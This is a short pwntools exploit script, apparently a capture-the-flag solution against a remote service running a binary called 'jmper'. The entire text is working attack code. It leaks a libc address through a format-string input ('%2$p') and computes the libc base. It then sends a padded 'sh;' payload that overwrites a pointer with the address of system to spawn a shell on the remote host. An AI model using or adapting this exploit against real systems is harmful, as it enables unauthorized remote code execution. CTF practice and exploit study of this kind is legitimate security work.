from pwn import *

#p = process('./jmper', env={'LD_PRELOAD':'./libc.so.6'})
p = remote('1.224.175.17', 9982)
#e = ELF('./jmper')
#l = e.libc
l = ELF('./libc.so.6')

p.recv()
p.sendline('2')
p.recv()
p.sendline('%2$p')

p.recvuntil('0x')
#libc = int(p.recvline().strip(), 16) - 0x55800
libc = int(p.recvline().strip(), 16) - 0x64e80
print hex(libc)

p.recv()
p.sendline('sh;'.ljust(0xe8, 'a')+p64(libc+l.sym['system']))

p.interactive()